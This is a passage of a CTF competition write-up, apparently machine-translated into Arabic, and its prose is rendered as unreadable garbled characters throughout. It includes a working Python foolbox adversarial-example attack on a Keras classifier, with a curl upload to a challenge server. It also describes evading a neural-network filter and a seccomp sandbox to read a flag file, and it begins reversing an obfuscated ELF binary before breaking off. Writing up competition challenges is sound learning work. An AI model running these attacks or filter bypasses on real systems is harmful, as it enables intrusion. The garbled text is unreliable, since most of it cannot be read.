ุงูุฎุงุฏู ูููุณ ุงููุณุงูุฉ ุจูู ุงููุชุฌูุงุช ุ ูุฃูู ูุฑูุฏ ูุซุงููุง ุฎุตุงูููุง ุชูุงููุง ุ ูููุณ ูุฌุฑุฏ ุตูุฑุฉ ุฐุงุช ุตูุฑุฉ "1". <br><br>  ูุญู ูุญุงูู ุงููุฌูู ุงูุฃูู ุงูุฐู ูุญุตู ุนููู ูู foolbox - ูุญุตู ุนูู ุงููุชุฌู ุงูููุงุฌู ุ ููู ุงูุฎุงุฏู ูุง ููุจูู (ุงููุณุงูุฉ ูุจูุฑุฉ ุฌุฏูุง).  ุซู ุฐูุจุช ุฅูู ุงูุจุฑุงุฑู ุ ูุจุฏุฃุช ูู ุฅุนุงุฏุฉ ุตูุงุบุฉ ุชุทุจููุงุช One Pixel Attack ุชุญุช MNIST ุ ููู ููุฌุญ ุฃู ุดูุก ุ ูุฃู ูุฐุง ุงููุฌูู ูุณุชุฎุฏู ุฎูุงุฑุฒููุฉ ุงูุชุทูุฑ ุงูุชูุงุถูู ุ ููู ููุณ ูุชุฏุฑุฌูุง ููุญุงูู ุฅูุฌุงุฏ ุงูุญุฏ ุงูุฃุฏูู ุงูุนุดูุงุฆู ุ ูุณุชุฑุดุฏุงู ุจุงูุชุบูุฑุงุช ูู ูุชุฌู ุงูุงุญุชูุงู.  ููู ุงุชุฌุงู ุงูุงุญุชูุงูุงุช ูู ูุชุบูุฑ ุ ูุฃู ุงูุดุจูุฉ ุงูุนุตุจูุฉ ูุงูุช ูุงุซูุฉ ููุบุงูุฉ. <br><br>  ูู ุงูููุงูุฉ ุ ูุงู ุนูู ุฃู ุฃุชุฐูุฑ ุงูุชูููุญ ุงูุฐู ูุงู ูู ุงูููู ุงููุตู ุงูุฃุตูู ุนูู ุงูุฎุงุฏู - "(Normilize ^ _ ^)".  ุจุนุฏ ุงูุชุทุจูุน ุงูุฏููู ุ ูุงู ูู ุงููููู ุชูููุฐ ุงููุฌูู ุจูุนุงููุฉ ุจุงุณุชุฎุฏุงู ุฎูุงุฑุฒููุฉ ุชุญุณูู L-BFGS ุ ุฃุฏูุงู ูู ุงูุงุณุชุบูุงู ุงูููุงุฆู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> foolbox <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> keras <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> numpy <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> np <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.attacks <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> LBFGSAttack <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.criteria <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> TargetClassProbability <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> keras.models <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> load_model <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> PIL <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> Image image = Image.open(<span class="hljs-string"><span class="hljs-string">'./ZeroSource.bmp'</span></span>) image = np.asarray(image, dtype=np.float32) / <span class="hljs-number"><span class="hljs-number">255</span></span> image = np.resize(image, (<span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) kmodel = load_model(<span class="hljs-string"><span class="hljs-string">'KerasModel.h5'</span></span>) fmodel = foolbox.models.KerasModel(kmodel, bounds=(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = image[:, :] <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: attack = LBFGSAttack(model=fmodel, criterion=TargetClassProbability(<span class="hljs-number"><span class="hljs-number">1</span></span>, p=<span class="hljs-number"><span class="hljs-number">.5</span></span>)) adversarial = attack(image[:, :], label=<span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">'FAIL'</span></span> quit() <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> kmodel.predict_proba(adversarial.reshape(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = np.array(adversarial * <span class="hljs-number"><span class="hljs-number">255</span></span>, dtype=<span class="hljs-string"><span class="hljs-string">'uint8'</span></span>) im = Image.open(<span class="hljs-string"><span class="hljs-string">'ZeroSource.bmp'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> y <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): im.putpixel((y, x), int(adversarial[x][y][<span class="hljs-number"><span class="hljs-number">0</span></span>])) im.save(<span class="hljs-string"><span class="hljs-string">'ZeroSourcead1.bmp'</span></span>) os.system(<span class="hljs-string"><span class="hljs-string">"curl -X POST -F image=@ZeroSourcead1.bmp 'http://51.15.100.188:36491/predict'"</span></span>)</code> </pre> <br>  ุณุทุฑ <b>ุงูุจุญุซ</b> : <b>H3y_Y0u'v_g01_4_n1c3_t1cket</b> <br><br><img src="https://habrastorage.org/webt/z0/tj/mx/z0tjmxh38kcphl5dxja6n9scepc.jpeg"><br><br><h2 style=";text-align:right;direction:rtl"><a name="Awesome_Vm"></a>  ููู 6.  ุฑููุจุฉ vm </h2><br>  ุชู ุฅุนุฏุงุฏ ูุฐู ุงููููุฉ ูู ูุจู ูุฑูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูุฏุฑุณุฉ CTF</a> . <br>  <i>ุชุญูู ูู ุฎุฏูุฉ ุงูุชุฏุฑูุจ ุงูุฌุฏูุฏุฉ!</i>  <i>zn.sibears.ru:8000</i> <i><br><br></i>  <i>ูู ุงูููุช ุงูุญุงูู ุ ูุฑูุฏ ุฅุดุฑุงูู ูู ุงุฎุชุจุงุฑ ุชุฌุฑูุจู ูุขูุฉ ุงูุชุฑุงุถูุฉ ุฌุฏูุฏุฉ ุชู ุฅูุดุงุคูุง ุฎุตูุตูุง ูุงุฎุชุจุงุฑ ููุงุฑุงุช ุงูุจุฑูุฌุฉ ุงูุฎุงุตุฉ ุจุงููุจุชุฏุฆูู ูุฏููุง.</i>  <i>ููุฏ ุฃุถููุง ุญูุงูุฉ ููุฑูุฉ ุถุฏ ุงูุบุด ููุฑูุฏ ุงูุขู ุงูุชุญูู ูู ูู ุดูุก ุจุฏูุฉ ูุจู ุชูุฏูู ุงูููุญ.</i>  <i>ูุณูุญ ูู VM ุจุชุดุบูู ุจุฑุงูุฌ ุจุณูุทุฉ ... ุฃู ููุณ ููุทุ!</i> <i><br><br></i>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">goo.gl/iKRTrH</a></i> <br><br>  <b>ุชูููุญุงุช</b> <br>  <i><b>10/27/2018 16:20</b></i> <i><br></i>  <i>ุฑุจูุง ููููู ุฎุฏุงุน ุฃู ุชุฌุงูุฒ ูุธุงู AIุ</i> <br><br><h4 style=";text-align:right;direction:rtl">  ุงููุตู: </h4><br><img src="https://habrastorage.org/webt/8k/p1/xy/8kp1xynj1xl3s7xtbs4_jznf0k4.png"><br><br>  ุงูุฎุฏูุฉ ุนุจุงุฑุฉ ุนู ูุธุงู ููุชุญูู ูู ุตุญุฉ ุงููููุงุช ุฐุงุช ุงูุงูุชุฏุงุฏ .cmpld ุงูุฐู ููุจูู ูุชุฑุฌู sibVM.  ุงููููุฉ ุงูุชู ูุฌุจ ุฃู ูุญููุง ุงูุจุฑูุงูุฌ ุงููุฑุณูุฉ: ุญุณุงุจ ูุฌููุน ุงูุฃุฑูุงู ุงููุฏุฑุฌุฉ ูู ููู input.txt ุ ุชุฐูุฑูุง ุฅูู ุญุฏ ูุง ุจููุงูุณุฉ ACM.  ุฃูุถูุง ุ ูุดูุฑ ูุตู ูุงุฌูุฉ ุงูููุจ ุฅูู ุฃูู ุณูุชู ูุญุต ุงูุจุฑุงูุฌ ุงููุฑุณูุฉ ุจุงุณุชุฎุฏุงู ุงูุฐูุงุก ุงูุงุตุทูุงุนู. <br><br>  ุชุชููู ุงูุฎุฏูุฉ ูู ุญุงููุชูู Docker: <b>ุนุงูู</b> <b>ุฑุจุท</b> <b>ุนูู ุงูููุจ</b> ู <b>prod_inter</b> . <br><br>  <b>ุนุงูู ุดุจูุฉ ุงูููุจ</b> ููุณุช ูุซูุฑุฉ ููุงูุชูุงู ุจุดูู ุฎุงุต ููุชุญููู.  ูู ูุง ููุนูู ูู ุชุฑุฌูุฉ ุงูููู ุงููุฑุณู ุฅูู ุญุงููุฉ prod_inter ุ ูุงูุฐู ูุญุฏุซ ุฏุงุฎูู ูู ุงูุฃุดูุงุก ุงูุฃูุซุฑ ุฅุซุงุฑุฉ ููุงูุชูุงู.  ููุชุทู ุงูุดูุฑุฉ ุงูููุงุจู ูุนุฑูุถ ุฃุฏูุงู: <br><img src="https://habrastorage.org/webt/ca/xv/em/caxvem0icoy4awon-funprflkps.jpeg"><br><br>  ูู ุญุงููุฉ <b>prod_inter</b> ุ ูุชู ูุญุต ุงูููู ุงููุฑุณู ูุชูููุฐู ุนูู ุจูุงูุงุช ุงูุงุฎุชุจุงุฑ.  ููู ุฅุฑุณุงู ุ ูุชู ุฅูุดุงุก ุฏููู ุฌุฏูุฏ ูู / tmp / ุจุดูู ุนุดูุงุฆู ุ ุญูุซ ูุชู ุญูุธ ุงูููู ุงููุฑุณู ุจุงุณู ุนุดูุงุฆู.  ูุชู ูุถุน ููู flag.txt ุฃูุถูุง ูู ุงูุฏููู ุงูุฐู ุชู ุฅูุดุงุคู ุ ูุงูุฐู ุฑุจูุง ูููู ูุฏููุง. <br><br>  ุซู ูุจุฏุฃ ุงูุฌุฒุก ุงูููุชุน: ุฅุฐุง ูุงู ุงูููู ุฃูุจุฑ ูู 8192 ุจุงูุช ุ ูุณูุชู ูุญุต ููู ุฅุฏุฎุงู ุงูุจุฑูุงูุฌ ุจุงุณุชุฎุฏุงู ุงูุฐูุงุก ุงูุงุตุทูุงุนู.  AI ูู ุดุจูุฉ ุนุตุจูุฉ ูุงุฆูุฉ ุงูุฏูุฉ ูุฏุฑุจุฉ ูุณุจููุง.  ุฅุฐุง ูุฌุญ ุงูุงุฎุชุจุงุฑ (ูุงูุช ุจูุงูุงุช ุงูุฅุฏุฎุงู ุฃูุซุฑ ูู 8192 ุจุงูุช ุ ูุนููุชูุง ุงูุดุจูุฉ ุงูุนุตุจูุฉ ุฅูู ุงููุฆุฉ ุงูุฃููู) ุ ูุฅู ุงูุจุฑูุงูุฌ ูุนูู ุนูู ุฎูุณุฉ ุงุฎุชุจุงุฑุงุช ูุฎุชููุฉ ุ ููุชู ุฅุฑุณุงู ุงููุชูุฌุฉ ูู ุฑุณุงูุฉ ุงุณุชุฌุงุจุฉ ูุนุฑุถูุง ุนูู ุงููุณุชุฎุฏู. <br><br>  ุฅุฐุง ูุงู ุญุฌู ุจูุงูุงุช ุงูุฅุฏุฎุงู ุฃูู ูู 8192 ุจุงูุช ุ ุฃู ุฃููู ูู ูุฌุชุงุฒูุง ุงูุงุฎุชุจุงุฑ ูู ูุจู ุงูุดุจูุฉ ุงูุนุตุจูุฉ ุ ุซู ูุจู ุงุฎุชุจุงุฑ ุงูุจุฑูุงูุฌ ูุชุญูู ูู ูุฌูุฏ ุณูุณูุฉ ูุฑุนูุฉ flag.txt ููู ููููุญุงููุงุช ููุชุญ ููู ุจููุณ ุงูุงุณู.  ุชุชู ูุฑุงูุจุฉ ุงููุตูู ุฅูู ููู flag.txt ุนู ุทุฑูู ุชุดุบูู ุงูุจุฑูุงูุฌ ูู ุตูุฏูู ุญูุงูุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">secfilter</a> ุ ูุงูุฐู ูุนุชูุฏ ุนูู ุชูููุงุช <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">SECCOMP</a> ุ ูุชุญููู ุณุฌู ุงูุชูููุฐ.  ููุฌุฏ ุฃุฏูุงู ุฑูุฒ ุงูุฎุฏูุฉ ุงูููุงุจู ููุซุงู ูุณุฌู ุนูุฏ ูุญุงููุฉ ูุชุญ ููู ูุญุธูุฑ: <br><br><img src="https://habrastorage.org/webt/vq/6-/-h/vq6--he6uvlc2zh6mvkmaqjow6q.jpeg"><br><br><img src="https://habrastorage.org/webt/lj/wg/vn/ljwgvn5gexwp23syezju5uexfjc.jpeg"><br><br>  ูุญู ูุฐู ุงููููุฉ ุ ููุช ุจุฅูุดุงุก ูุฌููุนุฉ ูู ุงูุจุฑุงูุฌ ููุชุฑุฌู sibVM ุงูุชู ุชูุชุญ ููู flag.txt ูุชุนุฑุถ ุงููููุฉ ุงูุนุฏุฏูุฉ ููุจุงูุช ุฅูุซ ูู ุงูููู.  ูู ุงูููุช ููุณู ุ ูุฌุชุงุฒ ูู ุจุฑูุงูุฌ ุจูุฌุงุญ ุงุฎุชุจุงุฑ ุงูุฐูุงุก ุงูุงุตุทูุงุนู.  ุจุนุฏ ุฐูู ุ ุณูุชู ุชูุฏูู ุชุญููู ุณุทุญู ููุดุจูุฉ ุงูุนุตุจูุฉ ููุตููุง ูุชุดุบูู ุงูุฌูุงุฒ ุงูุธุงูุฑู. <br><br><h4 style=";text-align:right;direction:rtl">  ุชุญููู ุงูุดุจูุฉ ุงูุนุตุจูุฉ </h4><br>  ููุฌุฏ ูููุฐุฌ ุงูุดุจูุฉ ุงูุนุตุจูุฉ ุงููุฏุฑุจุฉ ูู ููู cnn_model.h5.  ูููุง ููู ูุนูููุงุช ุนุงูุฉ ุญูู ููุฏุณุฉ ุงูุดุจูุฉ. <br><br><img src="https://habrastorage.org/webt/lj/7a/jj/lj7ajjrgzgml68gsmqsukdrn7wa.jpeg"><br><br>  ูุง ูุนุฑู ุจุงูุถุจุท ูุง ุชุนุชุฑู ุจู ุงูุดุจูุฉ ุงูุนุตุจูุฉ ุ ูุฐูู ุณูุญุงูู ุชุบุฐูุฉ ุงูุจูุงูุงุช ุงููุฎุชููุฉ ุจูุง.  ูู ุจููุฉ ุงูุดุจูุฉ ุ ูุชุถุญ ุฃูู ุนูุฏ ุงูุฅุฏุฎุงู ูุชููู ุตูุฑุฉ ุฃุญุงุฏูุฉ ุงูููุงุฉ ุจุญุฌู 100X100.  ูุชุฌูุจ ุชุฃุซูุฑ ุงูููุงุณ ุนูู ุงููุชูุฌุฉ ุ ุณูู ูุณุชุฎุฏู ุชุณูุณูุงุช ุชุจูุบ 10000 ุจุงูุช ุชู ุชุญููููุง ุฅูู ุตูุฑุฉ ุจุงุณุชุฎุฏุงู ุงููุธุงุฆู ุงููุณุชุฎุฏูุฉ ูู ุงูุฎุฏูุฉ.  ูููุง ููู ูุชุงุฆุฌ ุงูุดุจูุฉ ุงูุนุตุจูุฉ ุจุงุณุชุฎุฏุงู ุจูุงูุงุช ูุฎุชููุฉ: <br><br><img src="https://habrastorage.org/webt/s0/vd/tn/s0vdtnbuqcbnqxd1ho_5wzlyyps.jpeg"><br><br>  ุงุณุชูุงุฏูุง ุฅูู ุงููุชุงุฆุฌ ุ ูููู ุงูุชุฑุงุถ ุฃู ุงูุดุจูุฉ ุงูุนุตุจูุฉ ุณุชุชููู ุตูุฑูุง ูุน ุบูุจุฉ ุงูุฃููุงู ุงูุณูุฏุงุก (ุตูุฑ ุจุงูุช).  ุนูู ุงูุฃุฑุฌุญ ุ ุชุชุทูุจ ูุชุงุจุฉ ุจุฑูุงูุฌ ููุฑุฃ ุฃุญุฑู ุงูุนูู ุฃูู ุจูุซูุฑ ูู 1000 ุจุงูุช (ูููู ููุก ุงูุจุงูู ุจุงูุฃุตูุงุฑ) ุ ูุจุนุฏ ุฐูู ุณูู ููุจู ุงูุฐูุงุก ุงูุงุตุทูุงุนู ุงูุจุฑูุงูุฌ ุงููุฑุณู. <br><br>  ูููุง ูุฐูู ุ ูุญู ูุฐู ุงููููุฉ ุ ูุจูู ููุชุงุจุฉ ุงูุจุฑูุงูุฌ ุงููุทููุจ. <br><br><h4 style=";text-align:right;direction:rtl">  ูุชุฑุฌู SibVM </h4><br>  <b>ูููู ุงูุจุฑูุงูุฌ</b> <br>  ุงูุฎุทูุฉ ุงูุฃููู ูู ููู ุจููุฉ ููู ุงูุจุฑูุงูุฌ.  ุฎูุงู ุนูุณ ุงูููุณุฑ ุ ุงุชุถุญ ุฃู ุงูุจุฑูุงูุฌ ูุฌุจ ุฃู ูุจุฏุฃ ุจุฑุฃุณ ูุนููู ูุน ุนุฏุฉ ูุฌุงูุงุช ุฎุฏูุฉ ุ ูุจุนุฏ ุฐูู ููุงู ูุฌููุนุฉ ูู ุงูููุงูุงุช ุฐุงุช ุงููุนุฑูุงุช ุ ููู ุจูููุง ูุฌุจ ุฃู ูููู ููุงู ููุงู ุฑุฆูุณู ูู ุงูููุน Function. <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุงูุชุญูู ูู ุฑุฃุณ ุงูููู</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/2d/th/mb/2dthmbi3qyu4czj9qkc9zv8asam.png"><br></div></div><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุงุณุชุนุงุฏุฉ ุงูุณุฌูุงุช</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ab/vm/jb/abvmjbhfwcbxnu_nqxyue6pnlua.png"><br></div></div><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุนุงูุฌุฉ ุงูุณุฌูุงุช ูุฅุทูุงู ุงููุธููุฉ ุงูุฑุฆูุณูุฉ</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/eh/ki/qc/ehkiqcracavi3y75_bkj5kvcany.png"><br></div></div><br>  ูุงููุชูุฌุฉ ูู ุชูุณูู ููู ุงูุฅุฏุฎุงู ุงูุชุงูู: <br><br><img src="https://habrastorage.org/webt/ka/bs/py/kabspyig7f_jv7ysl_maco90itc.png"><br><br><h4 style=";text-align:right;direction:rtl">  ุฃููุงุน ุงูุจูุงูุงุช </h4><br>  ูุฏุนู ุงููุชุฑุฌู ุฃููุงุนูุง ูุฎุชููุฉ ูู ุงูููุงูุงุช.  ูููุง ููู ุฌุฏูู ููุนุฑูุงุชูุง ุ ูุงูุชู ุณุชููู ุถุฑูุฑูุฉ ูู ุงููุณุชูุจู ูุฅูุดุงุก ุงูุจุฑูุงูุฌ. <br><br><img src="https://habrastorage.org/webt/jf/fd/wc/jffdwc5yc6beasqr57sr3goy6ks.jpeg"><br><br><h4 style=";text-align:right;direction:rtl">  ุจูุงุก ุจุฑูุงูุฌ ูููุชุฑุฌู ุงูููุฑู </h4><br>  ููุง ุฐูุฑ ุฃุนูุงู ุ ูุฌุจ ุฃู ูููู ุงูุจุฑูุงูุฌ ุฅุฏุฎุงู ุฑุฆูุณู ูุน ููุน ุงููุธููุฉ (5).  ูู ุงูุชูุณูู ุงูุชุงูู: <br><br><img src="https://habrastorage.org/webt/bn/hw/g3/bnhwg3b5nh2egxv9dhi1aloarx8.png"><br><br>  ูู ููู ูู ุงูุตุนุจ ูุนุฑูุฉ ุฏูุฑุฉ ุชูููุฐ ุงูุจุฑูุงูุฌ ุงูุฑุฆูุณูุฉ. <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุฏูุฑุฉ ุงูุชูููุฐ ุงูุฑุฆูุณูุฉ</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/dl/ny/0r/dlny0rj2neh87uf72nljadx5bp0.png"><br></div></div><br>  ุชููู ุงูุฏุงูุฉ <code>decode_opcode</code> ุจุงุณุชุฑุฏุงุฏ ูุนูููุงุช ุญูู ุงูุนูููุฉ ุงูุชุงููุฉ ูู ุฑูุฒ ุงูุจุฑูุงูุฌ.  ุชุญุชูู ุฃูู ูุญุฏุชู ุจุงูุช ูู ูู ุนูููุฉ ุนูู ุฑูุฒ ุงูุนูููุฉ ูุนุฏุฏ ุงููุณุงุฆุท ูููุนูุง.  ุณูุชู ุชูุณูุฑ ุงูุจุงูุชุงุช ุงูููููุฉ ุงูุชุงููุฉ (ุงุนุชูุงุฏูุง ุนูู ููุน ูุนุฏุฏ ุงููุณุงุฆุท) ุนูู ุฃููุง ูุณูุทุงุช ููุนูููุฉ. <br><br>  ุชูุณูู ุฃูู ูุญุฏุชู ุจุงูุช ูู ุงูุนูููุฉ: <br><br><img src="https://habrastorage.org/webt/gn/70/av/gn70avw2rknailevx2byn4ezspw.png"><br><br>  ุจุนุฏ ุฐูู ุ ุณูุฑุงุฌุน ุจุนุถ ุงูุฅุฑุดุงุฏุงุช ุงูุชู ุณุชุณุงุนุฏูุง ูู ุงุณุชุฎุฑุงุฌ ุงูุนูู ูู ุงููุธุงู. <br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุงูุฑุณู ุงูุจูุงูู ูุชุฑุฌู ุงูุฃูุงูุฑ ุ ูุธููุฉ execute_opcode</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/ht/zm/pr/htzmprbyxebqmna2jg56vbi-jf4.png"><br></div></div><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  Opcode 0 - ููุชุญ ุงูููู (ูุชู ุชุญุฏูุฏ ุงุณู ุงูููู ุจูุงุณุทุฉ ูุณูุทุฉ ุงูุนูููุฉ ููู ูู ุงูููุน String) ููุถุน ูุญุชููุงุชู ูู ุฃุนูู ุงูููุฏุณ ููุงุฆู ูู ููุน <code>ByteArray</code> . </li><li style=";text-align:right;direction:rtl">  Opcode 2 - ูุนุฑุถ ุงููููุฉ ุงููุฎุฒูุฉ ูู ุงูุฌุฒุก ุงูุนููู ูู ุงูุฑุตุฉ.  ูุณูุก ุงูุญุธ ุ ูู ุชุนุฑุถ ูุฐู ุงูุนูููุฉ ูููุฉ ูุงุฆู ูู ุงูููุน <code>ByteArray</code> .  ูุญู ูุฐู ุงููุดููุฉ ุ ููููู ุงูุญุตูู ุนูู ุงูุนูุตุฑ i ุงูุตููู ูุนุฑุถู. </li></ul><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุนุงูุฌุฉ ุดูุฑุฉ ุงูุชุดุบูู 2</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/or/vt/0p/orvt0pk4mokjuxbgw-yqjxpac8u.png"><br></div></div><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุดูุฑุฉ ุงูุชุดุบูู 13 - ุฃุฎุฐ ุนูุตุฑ ูู ูุฌููุนุฉ ุญุณุจ ุงูููุฑุณ.  ูุชู ูุตู ุงูุตููู ูููุฑุณ ุงูุนูุงุตุฑ ูู ุงูููุฏุณ ุ ููุชู ุฏูุน ุงููุชูุฌุฉ ุฅูู ุงูููุฏุณ.  ููููุง ูุฐูู ุ ูุชุฌููุน ุจุฑูุงูุฌ ุนูู ุ ูู ุงูุถุฑูุฑู ูุถุน ุงูููุฑุณ ุนูู ุงูููุฏุณ. </li><li style=";text-align:right;direction:rtl">  ุดูุฑุฉ ุงูุชุดุบูู 7 - ุชุฏูุน ูุณูุทุฉ ุงูุนูููุฉ ุฅูู ุงูููุฏุณ. </li></ul><br>  ูุชูุฌุฉ ูุฐูู ุ ูุชููู ุงูุจุฑูุงูุฌ ูู 4 ุนูููุงุช ููุท: <br><br><img src="https://habrastorage.org/webt/tx/t4/ga/txt4gaep-ibcfsdx0wco7gg_heg.jpeg"><br><br><img src="https://habrastorage.org/webt/ja/mv/nt/jamvnt3jnzj6xlj8pfn_vnd0dbc.png"><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุงูุจุฑูุงูุฌ ุงูููุงุฆู</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/m1/6y/yn/m16yynqvryb1clqwwf6hsgv0mxs.jpeg"><br></div></div><br>  ุณุทุฑ ุงูุจุญุซ: <b>flag {76f98c7f11582d73303a4122fd04e48cba5498}</b> <br><br><img src="https://habrastorage.org/webt/yb/bw/am/ybbwamafhoijkcn2g871s_73wb8.jpeg"><br><br><h2 style=";text-align:right;direction:rtl"><a name="Hiddenresource"></a>  ุงูููู 7.  ุงููุตุฏุฑ ุงููุฎูู </h2><br>  ุฃุนุฏุช ูุฐู ุงููููุฉ ูู ูุจู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">RuCTF</a> . <br><br>  <i>ุจุงููุธุฑ ุฅูู ุฎุฏูุฉ <a href="">n24.elf</a> .</i>  <i>ุชุฎููู ููุท ุนูู 95.216.185.52 ูุชุญุตู ุนูู ุงูุนูู.</i> <br><br>  <b>ุชูููุญุงุช</b> <b><br></b>  <b><i>10/28/2018 20:00</i></b> <br>  <i>ุงููููุฉ ูู ุชุญู</i>  <i>ุชูุช ุฅุถุงูุฉ 24 ุณุงุนุฉ.</i> <br><br>  ุฃุธูุฑ ูุณุญ ุงูุฎุงุฏู ูููุตูู ุจุงุณุชุฎุฏุงู ุจุฑูุชููููุงุช ุงูุงุชุตุงู ุงูููุงุณูุฉ ุงููุตูู ุนุจุฑ SSH (ุงููููุฐ 22).  ุงูููู ุงูููุฏู ูู ููู ูุงุจู ููุชูููุฐ ูู ููุจู ELF (ุชูุช ุงูุฅุดุงุฑุฉ ุฅููู ุจููุงุฑุฉ ุจูุงุณุทุฉ ุงูุงูุชุฏุงุฏ ูู ุงูุงุณู) ููุธุงู Linux. <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#file UwRJ8iaEEd4tSQIe_n24.elf UwRJ8iaEEd4tSQIe_n24.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, stripped</span></span></code> </pre><br>  ุฃุธูุฑ ุงุณุชุฎุฏุงู ุงูุฃุฏุงุฉ ุงููุณุงุนุฏุฉ ููุณูุงุณู ูุฌูุฏ ุงูุฎุทูุท "/home/task/.ssh" ู "/home/task/.ssh/authorized_keys".  ุงุณุชูุชุงุฌ ุญูู ุฅููุงููุฉ ุงููุตูู ุฅูู ููู ููุชุงุญ ุงูุชูููุถ ุจุฏูู ูููุฉ ูุฑูุฑ SSH ูู ุงูููู ุงููุงุจู ููุชูููุฐ ELF (ุงููุดุงุฑ ุฅูููุง ูููุง ููู ุจุงุณู ุงูุฎุฏูุฉ). <br><br>  ูุญุชูู ุฌุฏูู ุงูุฑููุฒ ุนูู ุงููุธุงุฆู ุงููุงุฒูุฉ ููุชุญ ุงููููุงุช ูุงููุชุงุจุฉ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep fopen 23: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fopen@GLIBC_2.2.5 (2) # readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep write 32: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fwrite@GLIBC_2.2.5 (2)</span></span></code> </pre> <br>  ูุญุชูู ุฌุฏูู ุงูุฑููุฒ ุฃูุถูุง ุนูู ูุธุงุฆู ููุนูู ูุน ูุขุฎุฐ ููุฅูุดุงุก ุงูุนูููุงุช ููุนุฏ MD5. <br><br>  ุฃุธูุฑ ุนูุณ ุงูููู ูุฌูุฏ ุนุฏุฏ ูุจูุฑ ูู ุงูููุฒุงุช (ููุน ูู ุงูุชุดููุด).  ูู ุงูููุช ููุณู ุ ูุชู ุชูููุฐ ุงูููุฒุงุช ุจูู ูุฌููุนุงุช ุงูููุฏ ุ ูุงูุชู ูููู ุชูุณูููุง ุจุดูู ุนุงู ุฅูู ุนุฏุฉ ุฃููุงุน: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">    ยซ            OF ยป,   (  objdump): <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs"> 95b69b: 48 0f 44 c7 cmove rax,rdi 95b69f: 48 83 e7 01 and rdi,0x1 95b6a3: 4d 31 dc xor r12,r11 95b6a6: 71 05 jno 95b6ad &lt;MD5_Final@@Base+0x2d83f9&gt; 95b6a8: e9 f4 bf e1 ff jmp 7776a1 &lt;MD5_Final@@Base+0xf43ed&gt; 95b6ad: e9 1f 1a de ff jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt;</code> </pre> <br>  